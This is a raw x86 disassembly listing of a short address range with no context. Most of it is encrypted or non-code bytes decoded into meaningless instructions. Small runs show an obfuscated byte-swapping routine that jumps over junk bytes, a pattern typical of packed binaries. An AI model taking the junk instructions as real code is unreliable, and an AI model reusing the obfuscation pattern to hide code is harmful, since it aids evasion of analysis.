  40bfc2:	mov    esp,DWORD PTR [edx]
  40bfc4:	shl    DWORD PTR [edi],1
  40bfc6:	test   BYTE PTR [edi+0x3e7bc034],cl
  40bfcc:	loop   0x40bfe8
  40bfce:	and    eax,0x7e
  40bfd1:	loopne 0x40bfe6
  40bfd3:	mov    esp,0xf4b9a2dd
  40bfd8:	(bad)  
  40bfd9:	ja     0x40bff1
  40bfdb:	push   ecx
  40bfdc:	in     al,dx
  40bfdd:	push   edx
  40bfde:	loop   0x40bfab
  40bfe0:	std    
  40bfe1:	dec    edx
  40bfe2:	and    bl,BYTE PTR [eax-0x878213e]
  40bfe8:	xchg   esi,eax
  40bfe9:	dec    esp
  40bfea:	mov    ebp,0x3e67bd
  40bfef:	mov    cl,0xf6
  40bff1:	test   al,0xae
  40bff3:	inc    ecx
  40bff4:	fs mov ebp,0xad39387
  40bffa:	(bad)  
  40bffb:	stos   BYTE PTR es:[edi],al
  40bffc:	adc    ecx,ecx
  40bffe:	mov    ebx,DWORD PTR [ecx-0x219cf05]
  40c004:	jb     0x40c05e
  40c006:	loop   0x40c01f
  40c008:	fwait
  40c009:	pop    esp
  40c00a:	bound  edx,QWORD PTR [edx+0xd56627]
  40c010:	pop    ecx
  40c011:	or     bl,BYTE PTR [edi+ebx*4-0x1b]
  40c015:	or     BYTE PTR [edx+esi*8+0x68c537e1],ch
  40c01c:	div    BYTE PTR [ebp-0x3fbe7bf8]
  40c022:	pop    es
  40c023:	jo     0x40c00d
  40c025:	test   al,0x4c
  40c027:	loopne 0x40c051
  40c029:	mov    esp,0x27b75ceb
  40c02e:	(bad)  
  40c02f:	sub    eax,0x7476e80f
  40c034:	in     al,dx
  40c035:	sbb    ch,al
  40c037:	(bad)  
  40c038:	popa   
  40c039:	lods   al,BYTE PTR ds:[esi]
  40c03a:	pushf  
  40c03b:	jmp    0x6962:0x26bbec8b
  40c042:	or     esp,ebx
  40c044:	push   ebp
  40c045:	pop    ebx
  40c046:	call   FWORD PTR [edx+edx*8-0x4229e99]
  40c04d:	cmp    DWORD PTR [eax-0x69],ebx
  40c050:	mov    edi,DWORD PTR [eax]
  40c052:	stos   BYTE PTR es:[edi],al
  40c053:	push   ss
  40c054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c055:	mov    cl,0xe4
  40c057:	das    
  40c058:	(bad)  
  40c059:	int3   
  40c05a:	xchg   ecx,eax
  40c05b:	lea    ebp,[ecx]
  40c05d:	dec    ecx
  40c05e:	ds push ecx
  40c060:	inc    ebp
  40c061:	lods   al,BYTE PTR ds:[esi]
  40c062:	hlt    
  40c063:	push   es
  40c064:	sbb    eax,0x6686c948
  40c069:	pushf  
  40c06a:	jae    0x40c048
  40c06c:	xchg   edi,eax
  40c06d:	dec    ecx
  40c06e:	mov    edi,0xa9e86cc0
  40c073:	sbb    al,0x1d
  40c075:	add    dl,ah
  40c077:	inc    edx
  40c078:	mov    ebx,0x913c9b88
  40c07d:	(bad)  
  40c07f:	aad    0x33
  40c081:	inc    ecx
  40c082:	aad    0xc5
  40c084:	sbb    dl,bh
  40c086:	jmp    0x66c4:0x50f9a513
  40c08d:	push   es
  40c08e:	cmp    al,0xab
  40c090:	jne    0x40c048
  40c092:	out    0x59,eax
  40c094:	aaa    
  40c095:	icebp  
  40c096:	sahf   
  40c097:	ror    dh,1
  40c099:	lods   al,BYTE PTR ds:[esi]
  40c09a:	out    0xf4,al
  40c09c:	fld    st(0)
  40c09e:	xlat   BYTE PTR ds:[ebx]
  40c09f:	scas   al,BYTE PTR es:[edi]
  40c0a0:	pop    ds
  40c0a1:	add    BYTE PTR [ebx+0x12],0xa0
  40c0a5:	adc    ebx,eax
  40c0a7:	and    dl,BYTE PTR [edi-0x23486364]
  40c0ad:	push   ecx
  40c0ae:	and    eax,0x3ca34791
  40c0b3:	pop    esp
  40c0b4:	in     eax,dx
  40c0b5:	ja     0x40c081
  40c0b7:	push   esi
  40c0b8:	mov    ch,BYTE PTR [ebx-0x7d5c430]
  40c0be:	retf   
  40c0bf:	inc    ebp
  40c0c0:	cmp    BYTE PTR [ebx+0x28ff33b3],dl
  40c0c6:	xor    dh,BYTE PTR [esi+0x51]
  40c0c9:	push   ebx
  40c0ca:	jb     0x40c09b
  40c0cc:	inc    edx
  40c0cd:	test   al,0x9d
  40c0cf:	jne    0x40c113
  40c0d1:	popa   
  40c0d2:	cmc    
  40c0d3:	jae    0x40c05c
  40c0d5:	les    ecx,FWORD PTR [ebp-0x5c]
  40c0d8:	cmp    bh,dh
  40c0da:	leave  
  40c0db:	push   ss
  40c0dc:	jge    0x40c0bf
  40c0de:	mov    edx,0xa91db07
  40c0e3:	popf   
  40c0e4:	vpaddusb ymm3,ymm3,YMMWORD PTR [eax-0x7447dfee]
  40c0ec:	push   ebp
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    si,WORD PTR ds:[esi]
  40c144:	inc    esp
  40c145:	aad    0x39
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c160
  40c150:	cs cmc 
  40c152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c153:	jmp    0x48fb:0x7c79e8c0
  40c15a:	scas   al,BYTE PTR es:[edi]
  40c15b:	call   0x99770f87
  40c160:	retf   
  40c161:	add    ebx,0x73
  40c164:	(bad)  
  40c165:	cli    
  40c166:	and    al,0x26
  40c168:	pop    DWORD PTR [eax+0x54a33a9a]
  40c16e:	jno    0x40c1cf
  40c170:	dec    ecx
  40c171:	retf   
  40c172:	shr    BYTE PTR [ecx-0x6a1f5489],1
  40c178:	sub    al,0xa3
  40c17a:	pop    ebp
  40c17b:	adc    bh,ch
  40c17d:	and    al,0x7d
  40c17f:	ror    ch,1
  40c181:	push   esi
  40c182:	fcomp  DWORD PTR [esi]
  40c184:	jg     0x40c19d
  40c186:	retf   
  40c187:	out    dx,al
  40c188:	dec    ebx
  40c189:	and    DWORD PTR [eax],ebx
  40c18b:	jmp    0x31cc:0xcab59c43
  40c192:	pushf  
  40c193:	mov    bl,0xd9
  40c195:	hlt    
  40c196:	mov    ebp,0xa8777576
  40c19b:	jbe    0x40c1b9
  40c19d:	lea    ebp,[ebx+0x65]
  40c1a0:	out    0x9e,al
  40c1a2:	ja     0x40c1d4
  40c1a4:	push   edi
  40c1a5:	push   0xffffff88
  40c1a7:	jp     0x40c130
  40c1a9:	push   0x7b08e213
  40c1ae:	mov    dh,dl
  40c1b0:	inc    esi
  40c1b1:	add    BYTE PTR [ebx],dl
  40c1b3:	test   BYTE PTR ds:0xff225de8,ch
  40c1b9:	xchg   ebp,eax
  40c1ba:	push   edi
  40c1bb:	or     DWORD PTR [edi-0x20],0xffffff8d
  40c1bf:	lods   eax,DWORD PTR ds:[esi]
  40c1c0:	dec    ebx
  40c1c1:	mov    dh,BYTE PTR [edx]
  40c1c3:	sti    
  40c1c4:	test   al,0x7e
  40c1c6:	cmc    
  40c1c7:	loop   0x40c225
  40c1c9:	jnp    0x40c152
  40c1cb:	push   esp
  40c1cc:	or     al,al
  40c1ce:	sbb    bh,bl
  40c1d0:	inc    edx
  40c1d1:	leave  
  40c1d2:	cmp    BYTE PTR [ebp+eax*8-0x42647e4c],0xa
  40c1da:	mov    ds,WORD PTR [edx+0x61]
  40c1dd:	cdq    
  40c1de:	sbb    BYTE PTR [edi-0x6d],dh
  40c1e1:	fisttp QWORD PTR [eax-0x52]
  40c1e4:	fldenv [ecx+esi*4-0x2]
  40c1e8:	push   edi
  40c1e9:	in     al,dx
  40c1ea:	aam    0x42
  40c1ec:	xlat   BYTE PTR ds:[ebx]
  40c1ed:	jns    0x40c262
  40c1ef:	jne    0x40c1ff
  40c1f1:	aaa    
  40c1f2:	xor    cl,BYTE PTR [eax]
  40c1f4:	(bad)  
  40c1f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1f6:	jmp    0x7544:0x9b71a0db
  40c1fd:	ret    
  40c1fe:	inc    edx
  40c1ff:	fnsave [edx]
  40c201:	or     DWORD PTR [ebx-0x2],esp
  40c204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c205:	mov    WORD PTR [ebx-0x680ae4f1],fs
  40c20b:	lahf   
  40c20c:	pop    ebx
  40c20d:	sbb    esi,DWORD PTR ss:[edi+0x9]
  40c211:	xchg   edi,eax
  40c212:	lea    ebp,[ecx]
  40c214:	and    ebp,edx
  40c216:	das    
  40c217:	test   DWORD PTR [ebx-0x7b],0x8f15cef3
  40c21e:	mov    ch,0xf2
  40c220:	xor    eax,0xefa73ee7
  40c225:	popa   
  40c226:	jae    0xfb3ef24e
  40c22c:	inc    ecx
  40c22d:	ins    WORD PTR es:[edi],dx
  40c22f:	push   esp
  40c230:	clc    
  40c231:	iret   
  40c232:	repnz cwde 
  40c234:	ret    
  40c235:	popf   
  40c236:	loope  0x40c238
  40c238:	adc    DWORD PTR ds:0xabccbe09,esp
  40c23e:	outs   dx,DWORD PTR ds:[esi]
  40c23f:	sub    al,0x14
  40c241:	mov    WORD PTR [ebp+0x4],?
  40c244:	out    dx,eax
  40c245:	mov    dh,0x46
  40c247:	add    esp,ebp
  40c249:	add    esi,ebx
  40c24b:	ds sbb al,0x11
  40c24e:	inc    ebp
  40c24f:	sbb    ebx,DWORD PTR ss:[edx]
  40c252:	clc    
  40c253:	and    ecx,ebp
  40c255:	pop    edx
  40c256:	jmp    0x40c286
  40c258:	jl     0x40c291
  40c25a:	outs   dx,DWORD PTR ds:[esi]
  40c25b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c25c:	adc    al,0x2e
  40c25e:	mov    dl,0xbe
  40c260:	out    dx,eax
  40c261:	mov    ds:0x7f0782ca,al
  40c266:	lock cwde 
  40c268:	sub    BYTE PTR [edx],0x5e
  40c26b:	mov    ebx,0xbbd3f4d6
  40c270:	shl    BYTE PTR [ebx],1
  40c272:	xchg   esi,eax
  40c273:	inc    edi
  40c274:	jmp    0x129c55dd
  40c279:	cmp    ecx,edx
  40c27b:	pop    ss
  40c27c:	icebp  
  40c27d:	cli    
  40c27e:	int3   
  40c27f:	cdq    
  40c280:	or     edi,edx
  40c282:	sbb    DWORD PTR [edx-0x7],ebp
  40c285:	(bad)  
  40c286:	(bad)  
  40c287:	mov    eax,0xd3f3f48d
  40c28c:	hlt    
  40c28d:	imul   ebp,DWORD PTR [ebx+0x6020edab],0xb752e992
  40c297:	inc    edi
  40c299:	enter  0x713a,0x3
  40c29d:	xor    DWORD PTR [ebp-0x42],esi
  40c2a0:	(bad)  
  40c2a1:	pop    edi
  40c2a2:	je     0x40c319
  40c2a4:	dec    ebp
  40c2a5:	ja     0x40c261
  40c2a7:	add    cl,dh
  40c2a9:	add    ah,0x4d
  40c2ac:	adc    al,0x29
  40c2ae:	mov    edx,0x8730d180
  40c2b3:	aaa    
  40c2b4:	xchg   edi,eax
  40c2b5:	jge    0x40c23b
  40c2b7:	outs   dx,DWORD PTR ds:[esi]
  40c2b8:	or     dl,cl
  40c2ba:	jo     0x40c284
  40c2bc:	xchg   edx,eax
  40c2bd:	ror    BYTE PTR [eax],1
  40c2bf:	adc    ch,BYTE PTR [ebp-0x5468762d]
  40c2c5:	fcom   DWORD PTR [ecx-0x63bd5e91]
  40c2cb:	jbe    0x40c2ef
  40c2cd:	retf   
  40c2ce:	popa   
  40c2cf:	pop    edx
  40c2d0:	jp     0x40c29e
  40c2d2:	popa   
  40c2d3:	xor    eax,0x3fe789de
  40c2d8:	mov    ch,0x93
  40c2da:	out    dx,al
  40c2db:	adc    bh,ah
  40c2dd:	inc    ebp
  40c2de:	jle    0x40c2c6
  40c2e0:	jp     0x40c2fe
  40c2e2:	jl     0x40c345
  40c2e4:	cmp    dh,BYTE PTR ds:0x79eb32d8
  40c2ea:	(bad)  
  40c2ec:	lods   eax,DWORD PTR ds:[esi]
  40c2ed:	or     DWORD PTR [edx],esi
  40c2ef:	dec    ebx
  40c2f0:	sbb    al,0xf0
  40c2f2:	retf   
  40c2f3:	pusha  
  40c2f4:	in     eax,dx
  40c2f5:	sahf   
  40c2f6:	lods   eax,DWORD PTR ds:[esi]
  40c2f7:	mov    DWORD PTR [edx],esp
  40c2f9:	push   0xffa26d21
  40c2fe:	sbb    eax,0xcd066778
  40c303:	je     0x40c33f
  40c305:	pushf  
  40c306:	repnz inc ebp
  40c308:	cmp    DWORD PTR [ebp-0x41],ebx
  40c30b:	cs das 
  40c30d:	sti    
  40c30e:	fadd   QWORD PTR [ecx+ecx*4+0xe292432]
  40c315:	dec    ebp
  40c316:	out    dx,al
  40c317:	xchg   ecx,eax
  40c318:	mov    bh,0xb8
  40c31a:	pusha  
  40c31b:	repz mov cl,0xba
  40c31e:	add    al,0xa
  40c320:	rcr    DWORD PTR [ebp+0x3fa576d],1
  40c326:	add    esi,DWORD PTR [edi-0x65c15fab]
  40c32c:	ret    
  40c32d:	xchg   esi,eax
  40c32e:	popf   
  40c32f:	out    0xf9,eax
  40c331:	push   es
  40c332:	ds cmp cl,bh
  40c335:	pop    ebp
  40c336:	and    esi,DWORD PTR [edi+ebx*8+0x72]
  40c33a:	sbb    eax,DWORD PTR [ebp-0x6330cd07]
  40c340:	das    
  40c341:	inc    edx
  40c342:	add    DWORD PTR [ecx-0x6842a1ed],edi
  40c348:	ins    DWORD PTR es:[edi],dx
  40c349:	xor    edx,DWORD PTR [edx+edi*4-0x2cf32d1c]
  40c350:	add    al,0x53
  40c352:	out    dx,eax
  40c353:	ds retf 
  40c355:	out    0x0,eax
  40c357:	sbb    esp,0x3ca0a96
  40c35d:	pushf  
  40c35e:	ds adc al,0x63
  40c361:	mov    ds:0xe34a4bef,eax
  40c366:	retf   
  40c367:	pop    esi
  40c368:	dec    ecx
  40c369:	xchg   esp,eax
  40c36a:	adc    BYTE PTR [ecx+0x64a0058d],bh
  40c370:	int    0x4
  40c372:	xor    DWORD PTR [eax-0x17fe9dc5],ebx
  40c378:	jmp    0xdb7c:0x5a1266f7
  40c37f:	mov    dl,0x69
  40c381:	xchg   edx,eax
  40c382:	rcr    BYTE PTR [eax+0x24],cl
  40c385:	jecxz  0x40c310
  40c387:	jo     0x40c35e
  40c389:	lods   eax,DWORD PTR ds:[esi]
  40c38a:	into   
  40c38b:	addr16 push eax
  40c38d:	sub    eax,0x98164514
  40c392:	shl    al,cl
  40c394:	imul   edx,DWORD PTR [eax],0x1c43c2e1
  40c39a:	test   al,0x1b
  40c39c:	fisubr DWORD PTR [esi-0x37]
  40c39f:	or     al,0x5e
  40c3a1:	jle    0x40c3e8
  40c3a3:	aaa    
  40c3a4:	sbb    DWORD PTR [edx+esi*2+0x1c],esp
  40c3a8:	cmp    eax,0x2f254bb4
  40c3ad:	dec    esi
  40c3ae:	mov    al,ds:0x67c984c
  40c3b3:	stc    
  40c3b4:	jne    0x40c38f
  40c3b6:	in     al,0x7f
  40c3b8:	dec    ebp
  40c3b9:	das    
  40c3ba:	sbb    cl,BYTE PTR [eax]
  40c3bc:	and    DWORD PTR ds:0xc7f88c33,ebp
  40c3c2:	out    0x9e,eax
  40c3c4:	es inc edx
  40c3c6:	js     0x40c3bb
  40c3c8:	mov    cl,0x5e
  40c3ca:	aaa    
  40c3cb:	xchg   edi,eax
  40c3cc:	pusha  
  40c3cd:	test   eax,0xf7fb498a
  40c3d2:	in     eax,dx
  40c3d3:	push   ebp
  40c3d4:	ret    
  40c3d5:	xlat   BYTE PTR ds:[ebx]
  40c3d6:	popf   
  40c3d7:	xchg   ebp,eax
  40c3d8:	iret   
  40c3d9:	xor    dl,BYTE PTR [edi+edx*2+0x26e1c01f]
  40c3e0:	shl    dl,1
  40c3e2:	and    esi,DWORD PTR [eax+edi*8]
  40c3e5:	jns    0x40c3e6
  40c3e7:	and    al,0x8e
  40c3e9:	xchg   ebx,eax
  40c3ea:	retf   
  40c3eb:	mov    ds:0x4095a12a,eax
  40c3f0:	icebp  
  40c3f1:	add    al,BYTE PTR [esi-0xd32310d]
  40c3f7:	lahf   
  40c3f8:	addr16 cld 
  40c3fa:	cmc    
  40c3fb:	mov    ebp,0x2cecaeea
  40c400:	in     eax,dx
  40c401:	cdq    
  40c402:	sub    eax,0xb90e22c7
  40c407:	data16 fsub QWORD PTR [edi+0x44385e05]
  40c40e:	lock adc bh,al
  40c411:	retf   0x19a8
  40c414:	arpl   sp,si
  40c416:	imul   esi,eax,0x38fd02e6
  40c41c:	cmp    al,0xa4
  40c41e:	adc    BYTE PTR [edx-0x2545d1f0],bh
  40c424:	pop    ebx
  40c425:	jl     0x40c3d3
  40c427:	dec    edi
  40c428:	hlt    
  40c429:	xor    eax,0xddea656c
  40c42e:	mov    ?,WORD PTR [edi]
  40c430:	sub    eax,0xf344cb18
  40c435:	into   
  40c436:	pop    ds
  40c437:	pop    ss
  40c438:	fsub   st,st(4)
  40c43a:	neg    DWORD PTR [esi]
  40c43c:	xor    cl,BYTE PTR [esi+0x370ebfb7]
  40c442:	jmp    0x65d8:0xbe3e058d
  40c449:	and    BYTE PTR [ebx+0x69],cl
  40c44c:	cld    
  40c44d:	or     al,0x89
  40c44f:	push   es
  40c450:	es into 
  40c452:	ss out 0xa0,al
  40c455:	daa    
  40c456:	arpl   WORD PTR [ebx+ebx*4+0x70],sp
  40c45a:	inc    edx
  40c45b:	dec    ebx
  40c45c:	jmp    0x693958dc
  40c461:	mov    ebp,0xf68572f1
  40c466:	repz sbb ah,BYTE PTR [edx]
  40c469:	(bad)  
  40c46a:	pop    edi
  40c46b:	add    DWORD PTR [ecx+0x19],esp
  40c46e:	ror    DWORD PTR [ebx+0x496805ae],0xdd
  40c475:	xchg   edx,eax
  40c476:	xchg   ebp,eax
  40c477:	cmp    al,0x87
  40c479:	pop    esp
  40c47a:	xor    eax,0xc204d525
  40c47f:	test   eax,0x3924ec4a
  40c484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c485:	sub    al,0xf4
  40c487:	arpl   WORD PTR [edx+0x0],bx
  40c48a:	imul   esp,DWORD PTR [ebx],0x7a
  40c48d:	ficom  WORD PTR [edi+0x49]
  40c490:	xor    eax,0xa0da1ed8
  40c495:	scas   al,BYTE PTR es:[edi]
  40c496:	adc    bh,BYTE PTR [edx+eax*1]
  40c499:	push   ecx
  40c49a:	xlat   BYTE PTR ds:[ebx]
  40c49b:	cmc    
  40c49c:	arpl   WORD PTR [edx+edx*8+0x28],bp
  40c4a0:	mov    ebp,0x30224acf
  40c4a5:	jp     0x40c460
  40c4a7:	add    edx,eax
  40c4a9:	jle    0x40c494
  40c4ab:	lock ins BYTE PTR es:[edi],dx
  40c4ad:	pop    ebx
  40c4ae:	sti    
  40c4af:	aas    
  40c4b0:	jecxz  0x40c4e2
  40c4b2:	das    
  40c4b3:	or     al,0x23
  40c4b5:	jmp    0x59fc4734
  40c4ba:	(bad)  
  40c4bb:	sti    
  40c4bc:	push   0x89aa43fc
  40c4c1:	mov    DWORD PTR [edx+0x4d646ec3],ecx
  40c4c7:	inc    eax
  40c4c8:	xchg   BYTE PTR [ecx],bl
  40c4ca:	jge    0x40c4bb
  40c4cc:	cli    
  40c4cd:	(bad)
  40c4d1:	cmova  edi,ebx
  40c4d4:	pop    es
  40c4d5:	inc    ecx
  40c4d6:	stos   DWORD PTR es:[edi],eax
  40c4d7:	adc    al,0xd0
  40c4d9:	inc    ecx
  40c4da:	arpl   WORD PTR [edx+eax*4-0x287d5b49],cx
  40c4e1:	shl    BYTE PTR [edx],1
  40c4e3:	jle    0x40c511
  40c4e5:	sub    DWORD PTR [esi],ecx
  40c4e7:	nop
  40c4e8:	xchg   edi,eax
  40c4e9:	mov    edi,DWORD PTR [edi+eiz*8-0x4eb4654c]
  40c4f0:	xor    edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	dec    ebp
  40c541:	inc    ecx
  40c542:	icebp  
  40c543:	mov    bh,0x4d
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c511
  40c54d:	loopne 0x40c4ef
  40c54f:	ss xchg esi,eax
  40c551:	pushf  
  40c552:	fsub   DWORD PTR [eax+eiz*8+0x3d]
  40c556:	jecxz  0x40c59d
  40c558:	(bad)
  40c55c:	jg     0x40c5bb
  40c55e:	xor    bh,ah
  40c560:	xor    eax,0x4cf5c3a0
  40c565:	pop    ecx
  40c566:	mov    ds:0x99ce2431,al
  40c56b:	sbb    al,0x13
  40c56d:	push   0xfffffffb
  40c56f:	push   ecx
  40c570:	scas   eax,DWORD PTR es:[edi]
  40c571:	test   eax,0x1502fc1b
  40c576:	sub    DWORD PTR [edi+0x4c32ac3b],esp
  40c57c:	and    cl,BYTE PTR [ebx+0x65]
  40c57f:	adc    eax,0x65119ec2
  40c584:	imul   ebx,ecx,0x302594cb
  40c58a:	fisubr DWORD PTR [edi+eiz*1]
  40c58d:	loop   0x40c5c3
  40c58f:	adc    BYTE PTR [edx+0x152d9c6],0xce
  40c596:	and    esp,DWORD PTR [ecx]
  40c598:	push   es
  40c599:	outs   dx,DWORD PTR ds:[esi]
  40c59a:	pop    edx
  40c59b:	add    edx,DWORD PTR [ebx-0xe]
  40c59e:	int    0xa8
  40c5a0:	push   eax
  40c5a1:	add    bl,BYTE PTR [edi+0x61]
  40c5a4:	out    0x7b,al
  40c5a6:	add    edi,edx
  40c5a8:	and    edi,edi
  40c5aa:	loope  0x40c5fd
  40c5ac:	inc    esp
  40c5ad:	bound  ebp,QWORD PTR [ecx-0x66edfb4a]
  40c5b3:	pop    es
  40c5b4:	scas   al,BYTE PTR es:[edi]
  40c5b5:	loope  0x40c61f
  40c5b7:	outs   dx,BYTE PTR ds:[esi]
  40c5b8:	pop    esp
  40c5b9:	jg     0x40c627
  40c5bb:	mov    dh,0xa7
  40c5bd:	mov    esi,0xdf8009d1
  40c5c2:	push   edi
  40c5c3:	inc    edx
  40c5c4:	adc    al,0xc7
  40c5c6:	shl    DWORD PTR [eax+0x2dfe5d49],1
  40c5cc:	pushf  
  40c5cd:	repz in al,dx
  40c5cf:	sbb    al,0xf1
  40c5d1:	adc    eax,esi
  40c5d3:	adc    eax,0x1ae4a39f
  40c5d8:	pop    esp
  40c5d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5da:	or     dh,ch
  40c5dc:	bsr    esp,DWORD PTR [eax+0x4f]
  40c5e0:	mov    ds:0x505f79cd,al
  40c5e5:	dec    edx
  40c5e6:	ror    BYTE PTR [edi+0x1070bc43],1
  40c5ec:	fadd   QWORD PTR [eax+0x1a]
  40c5ef:	jb     0x40c5b4
  40c5f1:	jne    0x40c5d1
  40c5f3:	aaa    
  40c5f4:	push   cs
  40c5f5:	jnp    0x40c60c
  40c5f7:	jbe    0x40c5c9
  40c5f9:	xchg   edx,eax
  40c5fa:	lods   al,BYTE PTR ds:[esi]
  40c5fb:	int    0x4b
  40c5fd:	iret   
  40c5fe:	xchg   esi,eax
  40c5ff:	ins    DWORD PTR es:[edi],dx
  40c600:	pop    esp
  40c601:	stos   DWORD PTR es:[edi],eax
  40c602:	and    BYTE PTR [esp+ebp*1],0xda
  40c606:	jle    0x40c5a7
  40c608:	test   eax,0xefc8bf16
  40c60d:	dec    esp
  40c60e:	sbb    BYTE PTR [edx-0xa11812e],0xd
  40c615:	cmp    ebx,DWORD PTR [ecx]
  40c617:	nop
  40c618:	fmul   QWORD PTR [esi-0x6cbffc0]
  40c61e:	div    DWORD PTR [ebp+0x133cbeba]
  40c624:	int    0x47
  40c626:	popf   
  40c627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c628:	inc    esp
  40c629:	ret    
  40c62a:	div    DWORD PTR [ebx-0x5]
  40c62d:	loop   0x40c5b9
  40c62f:	popf   
  40c630:	outs   dx,WORD PTR ds:[esi]
  40c632:	xchg   DWORD PTR [edi-0x35],edx
  40c635:	xchg   ebx,ebx
  40c637:	(bad)  
  40c638:	mov    al,ds:0xac187457
  40c63d:	dec    esp
  40c63e:	retf   0x661f
  40c641:	or     dl,ch
  40c643:	ds push ebp
  40c645:	int3   
  40c646:	adc    bl,bh
  40c648:	in     eax,dx
  40c649:	inc    ebp
  40c64a:	cs push 0x32
  40c64d:	mov    ebx,0xd416c843
  40c652:	adc    DWORD PTR [edi+0x30],esi
  40c655:	pop    esp
  40c656:	xor    ecx,DWORD PTR [eax+0x18c13918]
  40c65c:	test   al,0x3
  40c65e:	loopne 0x40c652
  40c660:	mov    eax,0x6e32701
  40c665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c666:	hlt    
  40c667:	dec    esp
  40c668:	inc    esp
  40c669:	(bad)  [ebp-0x1a]
  40c66c:	mov    ch,BYTE PTR cs:[eax+0x3665ebb3]
  40c673:	fwait
  40c674:	data16 aad 0x33
  40c677:	mov    eax,0x8c0be9e
  40c67c:	inc    ecx
  40c67d:	mov    ebp,DWORD PTR [esi+esi*4+0x70]
  40c681:	pushf  
  40c682:	(bad)  
  40c683:	addr16 sub al,0xbc
  40c686:	test   DWORD PTR [ecx+0x6d3ab860],ecx
  40c68c:	add    DWORD PTR [eax],esi
  40c68e:	and    BYTE PTR cs:[esi],0x7c
  40c692:	or     ecx,DWORD PTR [ebp+0x32]
  40c695:	xor    eax,0x677f56ad
  40c69a:	pop    ds
  40c69b:	mov    ah,0xf6
  40c69d:	adc    eax,0x6f1a59e8
  40c6a2:	test   al,0x4c
  40c6a4:	jecxz  0x40c724
  40c6a6:	xchg   ebp,eax
  40c6a7:	icebp  
  40c6a8:	inc    esp
  40c6a9:	sbb    ecx,DWORD PTR [ebp+0x54]
  40c6ac:	(bad)  
  40c6ad:	popf   
  40c6ae:	dec    esp
  40c6af:	cmp    BYTE PTR [ebx],dl
  40c6b1:	aaa    
  40c6b2:	mov    edx,0xcc28d6a1
  40c6b7:	or     BYTE PTR [ecx],dh
  40c6b9:	pop    eax
  40c6ba:	(bad)  
  40c6bb:	sbb    eax,0xef03faab
  40c6c0:	cwde   
  40c6c1:	xchg   edi,eax
  40c6c2:	out    dx,al
  40c6c3:	mov    edx,0x42c82907
  40c6c8:	inc    ebp
  40c6c9:	int    0xbc
  40c6cb:	cmp    esp,esi
  40c6cd:	inc    eax
  40c6ce:	ror    BYTE PTR [edi+0x4f],0x98
  40c6d2:	rcr    DWORD PTR [edi],cl
  40c6d4:	adc    edx,DWORD PTR [esi-0x54]
  40c6d7:	fst    QWORD PTR es:[ecx-0x29]
  40c6db:	imul   ebp,ebp,0x4f777ea3
  40c6e1:	xchg   esi,eax
  40c6e2:	icebp  
  40c6e3:	fwait
  40c6e4:	jle    0x40c6f2
  40c6e6:	int    0x88
  40c6e8:	pmaddwd mm6,QWORD PTR [eax+0x44]
  40c6ec:	gs ins BYTE PTR es:[edi],dx
  40c6ee:	rcr    BYTE PTR [ecx-0x6],1
  40c6f1:	mov    ecx,0xe72d600
  40c6f6:	loopne 0x40c6a3
  40c6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f9:	mov    ss,WORD PTR [eax-0x19414576]
  40c6ff:	xchg   ecx,eax
  40c700:	aam    0xe0
  40c702:	xor    BYTE PTR [ebx+0x5d8fdb30],0xd
  40c709:	mov    BYTE PTR [esi+0x6d207858],bh
  40c70f:	bound  ebp,QWORD PTR [edx-0x6b]
  40c712:	sbb    dh,BYTE PTR [edi-0x2c6fbc0c]
